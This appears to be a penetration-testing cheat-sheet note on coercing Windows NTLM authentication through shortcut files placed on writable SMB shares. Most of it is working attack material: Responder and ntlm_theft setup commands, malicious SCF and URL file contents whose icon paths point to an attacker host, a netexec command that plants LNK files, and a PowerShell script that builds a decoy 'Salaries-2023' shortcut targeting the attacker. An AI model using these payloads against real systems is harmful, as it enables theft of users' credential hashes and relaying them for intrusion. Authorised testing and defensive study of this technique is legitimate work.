@@ -1,0 +1,184 @@
+---
+Primary_category: "[[MITM & COERCED AUTHS]]"
+title: "LIVING OFF THE LAND COERCION"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[MITM & COERCED AUTHS]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS PRIVESC]]
+
+#### *Shortcut Files*
+
+> ***e.g. SCF, LNK, URL and so on***
+
+##### *Workflow*
+
+We must bear in mind that *Windows File Explorer* always tries to render the icon of any existing resource within a given location *( i.e. a directory )*
+
+Every resource has its own icon, whose location is specified within it
+
+```bash
+<SNIP>
+iconFile=<ICON_FILE_PATH>
+<SNIP>
+```
+
+For instance, if we compromises a principal that has *WRITE* permissions over a certain *SMB* share, we could try to place a *shortcut* file within the latter whose *iconFile* points to a remote *SMB* server controlled by the attacker
+
+So, when any user accesses the share location where the *shortcut* file has been placed using the *Windows File Explorer*, the latter will try to start an *SMB* session to the target in order to request this resource i.e. the *shortcut's iconFile*
+
+Then, it will be asked for authentication, so we will receive an incoming authentication that we can leverage to either ***[[NTLM RELAY|relay]]*** it to another host or try to ***[[WINDOWS CREDENTIALS CRACKING#Net-NTLMv2 Response|crack the Net-NTLMv2 response]]***
+
+Any *shortcut* file we create should start with the **`@`** character to ensure that it appears on top of the share, and, hence, the *file explorer* parses it
+
+##### *Requirements*
+
+- ***The controlled local/domain user account must have WRITE permissions over a location within an SMB share***
+
+##### *Abuse*
+
+###### *Verifying if the user account has write permissions over the share*
+
+> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***
+
+```bash
+netexec smb '<TARGET>' --username '<USER>' --password '<PASSWD>' --shares
+```
+
+> ***[SMBMap](https://github.com/shawndevans/smbmap)***
+
+```bash
+smbmap -H '<TARGET>' -u '<USER>' -p '<PASSWD>' -d '<DOMAIN>'
+```
+
+###### *Setting up an SMB Server to intercept incoming authentications*
+
+- ***[Responder](https://github.com/lgandx/Responder)***
+
+***Setup***
+
+```bash
+git clone https://github.com/lgandx/Responder Responder
+cd !$ && python3 -m venv .venv
+. !$/bin/activate && pip3 install -r requirements.txt
+```
+
+***Usage***
+
+```bash
+python3 Responder.py --interface '<NETWORK_INTERFACE>' --verbose
+```
+
+###### *Creating the malicious Shortcut File*
+
+- ***[NTLM Theft](https://github.com/Greenwolf/ntlm_theft)***
+
+It generates multiple types of *NTLMv2* hash theft files
+
+***Setup***
+
+```bash
+git clone https://github.com/Greenwolf/ntlm_theft NTLMTheft
+cd !$ && python3 -m venv .venv
+. !$/bin/activate && pip3 install xlsxwriter
+```
+
+***Usage***
+
+```bash
+python3 ntlm_theft.py --generate all --server '<ATTACKER_IP>' --filename pwn
+```
+
+It creates a new directory named *pwn* which has the following content
+
+> [!IMPORTANT]- *Content*
+>
+> ```bash
+> pwn
+> ├── Autorun.inf
+> ├── desktop.ini
+> ├── pwn.application
+> ├── pwn.asx
+> ├── pwn-(externalcell).xlsx
+> ├── pwn-(frameset).docx
+> ├── pwn-(fulldocx).xml
+> ├── pwn-(handler).htm
+> ├── pwn.htm
+> ├── pwn-(icon).url
+> ├── pwn-(includepicture).docx
+> ├── pwn.jnlp
+> ├── pwn.library-ms
+> ├── pwn.lnk
+> ├── pwn.m3u
+> ├── pwn.pdf
+> ├── pwn-(remotetemplate).docx
+> ├── pwn.rtf
+> ├── pwn.scf
+> ├── pwn-(stylesheet).xml
+> ├── pwn.theme
+> ├── pwn-(url).url
+> ├── pwn.wax
+> └── zoom-attack-instructions.txt
+> 
+> 1 directory, 24 files
+> ```
+>
+
+- ***SCF***
+
+> [!BUG]- *pwn.scf*
+>
+> ```bash
+> [Shell]
+> Command=2
+> IconFile=\\<ATTACKER_IP>\share\legit.ico
+> [Taskbar]
+> Command=ToggleDesktop
+> ```
+>
+
+- ***URL***
+
+> [!BUG]- *pwn.url*
+>
+> ```bash
+> [InternetShortcut]
+> URL=https://www.domain.tld
+> IconIndex=0
+> IconFile=\\<ATTACKER_IP>\something\something.ico
+> ```
+>
+
+- ***LNK***
+
+***Netexec***
+
+> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***
+
+> ***Creation and Upload***
+
+```bash
+netexec smb '<TARGET>' --username '<USER>' --password '<PASSWD>' --module slinky --options 'name=<ATTACKER_SMB_SHARE>' 'server=<ATTACKER_IP>'
+```
+
+> ***Cleanup***
+
+```bash
+netexec smb '<TARGET>' --username '<USER>' --password '<PASSWD>' --module slinky --options 'name=<ATTACKER_SMB_SHARE>' 'server=<ATTACKER_IP>' 'CLEANUP=True'
+```
+
+***Powershell***
+
+```bash
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\pwn.lnk") # .LNK Creation
+$lnk.TargetPath = "\\<ATTACKER_IP>\pwn.png" # .LNK Target
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Salaries-2023."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
